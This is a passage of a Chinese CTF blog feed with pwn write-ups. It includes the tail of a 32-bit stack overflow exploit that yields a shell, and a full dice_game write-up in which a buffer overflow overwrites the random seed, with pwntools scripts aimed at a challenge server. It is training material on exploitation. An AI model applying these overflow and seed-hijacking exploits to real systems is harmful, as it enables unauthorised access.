punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'AAA'</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"ebp_addr==>"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>ebp_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> p32<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x20</span>payload1 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>ebp_addr<span class="token number">-0x28</span><span class="token operator">+</span><span class="token number">0x4</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：</p><pre class=" language-java"><code class="language-java">ebp_addr<span class="token operator">==</span><span class="token operator">></span><span class="token number">0xffef9ae8</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x29</span> bytes<span class="token operator">:</span>    <span class="token number">00000000</span>  <span class="token number">7d</span> <span class="token number">85</span> <span class="token number">04</span> <span class="token number">08</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  │<span class="token punctuation">}</span>···│AAAA│AAAA│AAAA│    <span class="token number">00000010</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  │AAAA│AAAA│AAAA│AAAA│    <span class="token number">00000020</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  c4 9a ef ff  0a                        │AAAA│····│·│    <span class="token number">00000029</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive modeCan you solve <span class="token keyword">this</span> sign<span class="token operator">-</span>in problem<span class="token operator">?</span>$ whoami<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x7</span> bytes<span class="token operator">:</span>    <span class="token string">'whoami\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x7</span> bytes<span class="token operator">:</span>    <span class="token string">'hunter\n'</span>hunter$  </code></pre><h2 id="对于lea-esp-ecx-0x4"><a href="#对于lea-esp-ecx-0x4" class="headerlink" title="对于lea esp,[ecx-0x4]"></a>对于lea esp,[ecx-0x4]</h2><p>出现这个指令而不是leave说明这个程序应该是在64位下编译的32位程序，大佬说这是i386的平栈方式。main函数的ret，一旦覆盖大量的数据，就会导致栈顶地址出错。所以之前我一直认为是无法溢出成功的。因为一旦溢出大量数据，也会修改ECX的值，导致ESP的值出问题。</p><p>实际上在x64下编译的x86程序在ret前都会产生这一段代码。在我们使用栈溢出利用的时候，会导致栈帧出错。刚开始的初学者很容易一筹莫展（比如以前的我），因为无法完成一次EIP覆写。但是实际上，反复调试了几遍之后，就发现这道题并非不可利用。<br>其实既然ECX对ret时的ESP能产生直接影响，那么通过控制ECX也能间接控制ESP<br>只需要找到pop ecx 时候对应的栈顶，就能控制ECX。进而控制整个栈帧。</p><p>一般会利用这个指令来进行stack povit，栈迁移到bss段之类的</p><p>详情见：<a href="https://www.anquanke.com/post/id/187875" target="_blank" rel="noopener">https://www.anquanke.com/post/id/187875</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-challenge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-CHALLENGE-DICE_GAME</title>
      <link href="/2020/08/19/xctf-challenge-dice-game/"/>
      <url>/2020/08/19/xctf-challenge-dice-game/</url>
      
        <content type="html"><![CDATA[<h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><pre class=" language-python"><code class="language-python">主函数：__int64 __fastcall main<span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> char <span class="token operator">**</span>a2<span class="token punctuation">,</span> char <span class="token operator">**</span>a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  char buf<span class="token punctuation">[</span><span class="token number">55</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>0h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>50h<span class="token punctuation">]</span>  char v5<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>37h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>19h<span class="token punctuation">]</span>  ssize_t v6<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>38h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>18h<span class="token punctuation">]</span>  unsigned int seed<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>40h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>10h<span class="token punctuation">]</span>  unsigned int v8<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>4Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>4h<span class="token punctuation">]</span>  memset<span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> 48uLL<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>seed <span class="token operator">=</span> time<span class="token punctuation">(</span>0LL<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">//</span>随机数种子  printf<span class="token punctuation">(</span><span class="token string">"Welcome, let me know your name: "</span><span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>  fflush<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> 80uLL<span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token operator">//</span> overflow  <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">&lt;=</span> <span class="token number">49</span> <span class="token punctuation">)</span>    buf<span class="token punctuation">[</span>v6 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  printf<span class="token punctuation">(</span><span class="token string">"Hi, %s. Let's play a game.\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  fflush<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>  srand<span class="token punctuation">(</span>seed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v8 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    printf<span class="token punctuation">(</span><span class="token string">"Game %d/50\n"</span><span class="token punctuation">,</span> v8<span class="token punctuation">)</span><span class="token punctuation">;</span>     v5 <span class="token operator">=</span> sub_A20<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      fflush<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v8 <span class="token operator">==</span> <span class="token number">50</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      sub_B28<span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token operator">+</span><span class="token operator">+</span>v8<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  puts<span class="token punctuation">(</span><span class="token string">"Bye bye!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> 0LL<span class="token punctuation">;</span><span class="token punctuation">}</span>signed __int64 sub_A20<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  signed __int64 result<span class="token punctuation">;</span> <span class="token operator">//</span> rax  __int16 v1<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>4h<span class="token punctuation">]</span>  __int16 v2<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>Eh<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>2h<span class="token punctuation">]</span>  printf<span class="token punctuation">(</span><span class="token string">"Give me the point(1~6): "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  fflush<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>  _isoc99_scanf<span class="token punctuation">(</span><span class="token string">"%hd"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">//</span>scanf的格式化字符串，h代表短数据，l代表长数据  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> v1 <span class="token operator">&lt;=</span> <span class="token number">6</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v2 <span class="token operator">=</span> rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                        <span class="token operator">//</span>v2 <span class="token operator">==</span> <span class="token number">1</span><span class="token operator">~</span><span class="token number">6</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">|</span><span class="token operator">|</span> v1 <span class="token operator">></span> <span class="token number">6</span> <span class="token operator">|</span><span class="token operator">|</span> v2 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">|</span><span class="token operator">|</span> v2 <span class="token operator">></span> <span class="token number">6</span> <span class="token punctuation">)</span>      _assert_fail<span class="token punctuation">(</span><span class="token string">"(point>=1 &amp;&amp; point&lt;=6) &amp;&amp; (sPoint>=1 &amp;&amp; sPoint&lt;=6)"</span><span class="token punctuation">,</span> <span class="token string">"dice_game.c"</span><span class="token punctuation">,</span> 24u<span class="token punctuation">,</span> <span class="token string">"dice_game"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">//</span>无视    <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">==</span> v2 <span class="token punctuation">)</span>      <span class="token punctuation">{</span>      puts<span class="token punctuation">(</span><span class="token string">"You win."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      result <span class="token operator">=</span> 1LL<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      puts<span class="token punctuation">(</span><span class="token string">"You lost."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      result <span class="token operator">=</span> 0LL<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    puts<span class="token punctuation">(</span><span class="token string">"Invalid value!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> 0LL<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span>后门：int __fastcall sub_B28<span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  char s<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>10h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>70h<span class="token punctuation">]</span>  FILE <span class="token operator">*</span>stream<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>78h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>8h<span class="token punctuation">]</span>  printf<span class="token punctuation">(</span><span class="token string">"Congrats %s\n"</span><span class="token punctuation">,</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>  stream <span class="token operator">=</span> fopen<span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  fgets<span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">;</span>  puts<span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> fflush<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><pre class=" language-python"><code class="language-python">hunter@hunter<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>XCTF<span class="token operator">/</span>xctf_challenge<span class="token operator">/</span>dice_game$ checksec dice_game<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/XCTF/xctf_challenge/dice_game/dice_game'</span>    Arch<span class="token punctuation">:</span>     amd64<span class="token number">-64</span><span class="token operator">-</span>little    RELRO<span class="token punctuation">:</span>    Full RELRO    Stack<span class="token punctuation">:</span>    No canary found    NX<span class="token punctuation">:</span>       NX enabled    PIE<span class="token punctuation">:</span>      PIE enabledhunter@hunter<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>XCTF<span class="token operator">/</span>xctf_challenge<span class="token operator">/</span>dice_game$ hunter@hunter<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>XCTF<span class="token operator">/</span>xctf_challenge<span class="token operator">/</span>dice_game$ <span class="token punctuation">.</span><span class="token operator">/</span>dice_gameWelcome<span class="token punctuation">,</span> let me know your name<span class="token punctuation">:</span> dadHi<span class="token punctuation">,</span> dad<span class="token punctuation">.</span> Let's play a game<span class="token punctuation">.</span>Game <span class="token number">1</span><span class="token operator">/</span><span class="token number">50</span>Give me the point<span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">~</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">2</span>You lost<span class="token punctuation">.</span>Bye bye!</code></pre><p>保护全开几乎全开，结合上面的后门应该主要目的是实现跳转。</p><h2 id="伪代码分析"><a href="#伪代码分析" class="headerlink" title="伪代码分析"></a>伪代码分析</h2><pre class=" language-c"><code class="language-c">main函数中：<span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">55</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-50h]</span>  <span class="token keyword">char</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+37h] [rbp-19h]</span>  ssize_t v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+38h] [rbp-18h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> seed<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+40h] [rbp-10h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+4Ch] [rbp-4h]</span>v6 <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">80uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token comment" spellcheck="true">// overflow</span></code></pre><p>显然可以读入80个字符，而buf到rbp的距离也是80个字符（0x50），所以 这里定义的变量都可以覆盖成我们想要的</p><pre class=" language-c"><code class="language-c"><span class="token keyword">signed</span> __int64 <span class="token function">sub_A20</span><span class="token punctuation">(</span><span class="token punctuation">)</span>函数中：<span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%hd"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//scanf的格式化字符串，h代表短数据，l代表长数据</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> v1 <span class="token operator">&lt;=</span> <span class="token number">6</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v2 <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">//v2 == 1~6</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">></span> <span class="token number">6</span> <span class="token operator">||</span> v2 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">||</span> v2 <span class="token operator">></span> <span class="token number">6</span> <span class="token punctuation">)</span>      <span class="token function">_assert_fail</span><span class="token punctuation">(</span><span class="token string">"(point>=1 &amp;&amp; point&lt;=6) &amp;&amp; (sPoint>=1 &amp;&amp; sPoint&lt;=6)"</span><span class="token punctuation">,</span> <span class="token string">"dice_game.c"</span><span class="token punctuation">,</span> <span class="token number">24u</span><span class="token punctuation">,</span> <span class="token string">"dice_game"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//无视</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">==</span> v2 <span class="token punctuation">)</span>      <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You win."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      result <span class="token operator">=</span> <span class="token number">1LL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You lost."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid value!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>主要功能是读入一个短整型数字于随机数进行比较，相等则 you win。在main函数中对该函数的调用可知这个比较会进行50次<br>成功比到50次后就进入后门获取flag</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p><strong>程序想让我们和随机数 成功比对50次，这显然是不可能的。所以我们利用buf数组的溢出将随机数种子篡改为0.因为随机数种子在read之前就赋值了，我们篡改后就会固定不变。</strong><br>（之前我一直在想办法篡改v8，使其等于50，这样我成功猜对一个数就行了，但是v8的赋值是在read之后所以，还是会被改回来。为此我在这里花了近两个小时，很烦)</p><h3 id="获取随机数"><a href="#获取随机数" class="headerlink" title="获取随机数"></a>获取随机数</h3><p>在linux中编写一个获取随机数的程序（不要再Windows中，因为环境不一样）</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> seed<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token function">srand</span><span class="token punctuation">(</span>seed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">50</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d,"</span><span class="token punctuation">,</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> </code></pre><p>结果：</p><pre class=" language-python"><code class="language-python">hunter@hunter<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>XCTF<span class="token operator">/</span>xctf_challenge<span class="token operator">/</span>dice_game$ <span class="token punctuation">.</span><span class="token operator">/</span>test <span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span></code></pre><p>直接复制下来当作脚本元组</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> time <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true">#sh = process('./dice_game')</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'220.249.52.133'</span><span class="token punctuation">,</span><span class="token number">52660</span><span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">64</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'BBBB'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#这波是没注意v8的赋值问题，浪费时间的证据</span><span class="token comment" spellcheck="true">#gdb.attach(sh)                                #主要是p64（0）这里篡改了seed[2]的值起作用</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>rand <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    seed <span class="token operator">=</span> str<span class="token punctuation">(</span>rand<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>seed<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#leep(1)</span>    